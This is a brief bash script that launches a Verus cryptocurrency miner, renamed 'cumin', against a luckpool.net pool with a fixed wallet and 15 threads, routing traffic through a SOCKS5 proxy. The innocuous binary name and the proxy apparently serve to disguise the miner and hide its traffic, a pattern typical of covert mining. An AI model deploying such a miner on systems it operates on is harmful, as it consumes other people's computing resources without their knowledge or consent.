#!/bin/bash
chmod +x cumin
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
WORKER=$(echo $(shuf -i 1-1 -n 1)-X)
PROXY=socks5://192.111.135.21:4145
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 15 -x $PROXY
